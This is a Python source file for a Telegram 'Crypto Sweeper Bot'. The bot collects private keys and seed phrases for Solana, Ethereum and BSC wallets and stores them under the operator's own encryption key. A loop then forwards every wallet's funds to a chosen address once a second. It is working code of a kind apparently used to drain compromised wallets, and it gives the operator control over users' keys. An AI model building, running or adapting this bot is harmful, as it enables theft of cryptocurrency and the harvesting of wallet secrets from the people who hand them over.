from flask import Flask
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder, CommandHandler, ContextTypes,
    ConversationHandler, MessageHandler, filters, CallbackQueryHandler
)
import asyncio
import logging
import json
import os
from cryptography.fernet import Fernet
import threading
from threading import Lock
from datetime import datetime

from chains import solana, ethereum, bsc
from config import TELEGRAM_BOT_TOKEN

# ---------------- CONFIG ----------------
app = Flask(__name__)
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

DATA_FILE = "wallets.json"
TX_LOG_FILE = "transactions.json"
SECRET_KEY = os.getenv("SECRET_KEY")
PORT = int(os.getenv("PORT", 5000))

if not SECRET_KEY or not TELEGRAM_BOT_TOKEN:
    raise Exception("Missing SECRET_KEY or TELEGRAM_BOT_TOKEN!")

cipher = Fernet(SECRET_KEY.encode())

# ---------------- STORAGE ----------------
data_store = {}
tx_log = []
data_lock = Lock()

def encrypt(data: str) -> str:
    return cipher.encrypt(data.encode()).decode()

def decrypt(data: str) -> str:
    return cipher.decrypt(data.encode()).decode()

def load_data():
    global data_store, tx_log
    if os.path.exists(DATA_FILE):
        try:
            with open(DATA_FILE) as f:
                data_store = {int(k): v for k, v in json.load(f).items()}
        except Exception as e:
            logger.error(f"Load wallets error: {e}")

    if os.path.exists(TX_LOG_FILE):
        try:
            with open(TX_LOG_FILE) as f:
                tx_log = json.load(f)
        except:
            pass

def save_data():
    try:
        with data_lock:
            with open(DATA_FILE, "w") as f:
                json.dump(data_store, f, indent=2)
            with open(TX_LOG_FILE, "w") as f:
                json.dump(tx_log[-100:], f, indent=2)
    except Exception as e:
        logger.error(f"Save error: {e}")

def log_transaction(user_id, chain, status):
    tx_log.append({
        "time": datetime.utcnow().isoformat(),
        "user_id": user_id,
        "chain": chain,
        "status": status
    })
    save_data()

# ---------------- FLASK ----------------
@app.route("/")
def home():
    return "Bot is alive ✅"

# ---------------- STATES ----------------
CHAIN, SECRET, DESTINATION = range(3)

def main_menu():
    keyboard = [
        [InlineKeyboardButton("➕ Add New Wallet", callback_data="add_wallet")],
        [InlineKeyboardButton("📂 My Wallets", callback_data="my_wallets")],
        [InlineKeyboardButton("🗑 Remove Last", callback_data="remove_last")],
        [InlineKeyboardButton("📜 Transactions", callback_data="tx_history")]
    ]
    return InlineKeyboardMarkup(keyboard)

# ---------------- HANDLERS ----------------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("⚡ **Crypto Sweeper Bot**", 
                                  parse_mode="Markdown", 
                                  reply_markup=main_menu())

async def main_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    if query.data == "add_wallet":
        keyboard = [
            [InlineKeyboardButton("Solana", callback_data="solana")],
            [InlineKeyboardButton("Ethereum", callback_data="ethereum")],
            [InlineKeyboardButton("BSC", callback_data="bsc")]
        ]
        await query.edit_message_text("**Select Chain:**", parse_mode="Markdown",
                                    reply_markup=InlineKeyboardMarkup(keyboard))
        return CHAIN

    elif query.data == "my_wallets":
        await show_wallets(query)
        return ConversationHandler.END
    elif query.data == "remove_last":
        await remove_last(query)
        return ConversationHandler.END
    elif query.data == "tx_history":
        await show_transactions(query)
        return ConversationHandler.END

async def chain_selected(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    context.user_data["chain"] = query.data
    await query.edit_message_text(f"✅ Selected **{query.data.upper()}**\n\nSend your Private Key or Seed Phrase:")
    return SECRET

async def receive_secret(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["secret"] = update.message.text.strip()
    await update.message.reply_text("Now send the **Destination Address**:")
    return DESTINATION

async def receive_destination(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    chain = context.user_data["chain"]
    secret = context.user_data["secret"]
    dest = update.message.text.strip()

    wallet_type = "seed" if " " in secret else "private_key"

    wallet = {
        "chain": chain,
        "type": wallet_type,
        "secret": encrypt(secret),
        "destination": dest
    }

    with data_lock:
        data_store.setdefault(user_id, []).append(wallet)
        save_data()

    await update.message.reply_text(
        f"✅ **Wallet Added!**\nChain: {chain.upper()}\nType: {wallet_type}\nDest: `{dest}`",
        parse_mode="Markdown",
        reply_markup=main_menu()
    )
    context.user_data.clear()
    return ConversationHandler.END

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Cancelled.", reply_markup=main_menu())
    context.user_data.clear()
    return ConversationHandler.END

# Quick actions
async def show_wallets(query):
    user_id = query.from_user.id
    with data_lock:
        wallets = data_store.get(user_id, [])
    if not wallets:
        await query.edit_message_text("No wallets yet.", reply_markup=main_menu())
        return
    text = "📂 **Your Wallets**\n\n"
    for i, w in enumerate(wallets, 1):
        text += f"{i}. {w['chain'].upper()} → `{w['destination']}`\n"
    await query.edit_message_text(text, parse_mode="Markdown", reply_markup=main_menu())

async def remove_last(query):
    user_id = query.from_user.id
    with data_lock:
        if user_id in data_store and data_store[user_id]:
            removed = data_store[user_id].pop()
            if not data_store[user_id]:
                del data_store[user_id]
            save_data()
            await query.edit_message_text(f"🗑 Removed **{removed['chain'].upper()}** wallet", 
                                        parse_mode="Markdown", reply_markup=main_menu())
        else:
            await query.edit_message_text("Nothing to remove.", reply_markup=main_menu())

async def show_transactions(query):
    user_id = query.from_user.id
    user_tx = [t for t in tx_log[-15:] if t["user_id"] == user_id]
    if not user_tx:
        await query.edit_message_text("No transactions yet.", reply_markup=main_menu())
        return
    text = "📜 **Recent Activity**\n\n"
    for t in reversed(user_tx):
        text += f"• {t['time'][:19]} | {t['chain'].upper()} | {t['status']}\n"
    await query.edit_message_text(text, parse_mode="Markdown", reply_markup=main_menu())

# ---------------- SWEEPER ----------------
async def sweeper_loop():
    logger.info("🚀 Sweeper loop started")
    semaphore = asyncio.Semaphore(10)
    while True:
        tasks = []
        with data_lock:
            current = list(data_store.items())
        for uid, wallets in current:
            for w in wallets:
                tasks.append(process_wallet(uid, w, semaphore))
        if tasks:
            await asyncio.gather(*tasks, return_exceptions=True)
        await asyncio.sleep(1)

async def process_wallet(user_id, wallet, semaphore):
    async with semaphore:
        try:
            secret = decrypt(wallet["secret"])
            func = {"solana": solana.forward, "ethereum": ethereum.forward, "bsc": bsc.forward}[wallet["chain"]]
            await asyncio.to_thread(func, secret, wallet["destination"], user_id)
            log_transaction(user_id, wallet["chain"], "Success")
        except Exception as e:
            log_transaction(user_id, wallet["chain"], f"Failed: {str(e)[:80]}")

# ---------------- MAIN ----------------
async def main():
    load_data()
    application = ApplicationBuilder().token(TELEGRAM_BOT_TOKEN).build()

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("start", start),
                      CallbackQueryHandler(main_button)],
        states={
            CHAIN: [CallbackQueryHandler(chain_selected)],
            SECRET: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_secret)],
            DESTINATION: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_destination)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
        per_message=False
    )

    application.add_handler(conv_handler)

    asyncio.create_task(sweeper_loop())

    await application.initialize()
    await application.start()
    await application.updater.start_polling(drop_pending_updates=True)
    await asyncio.Event().wait()

if __name__ == "__main__":
    logger.info(f"Starting on port {PORT}")
    threading.Thread(
        target=lambda: app.run(host="0.0.0.0", port=PORT, debug=False, use_reloader=False),
        daemon=True
    ).start()
    asyncio.run(main())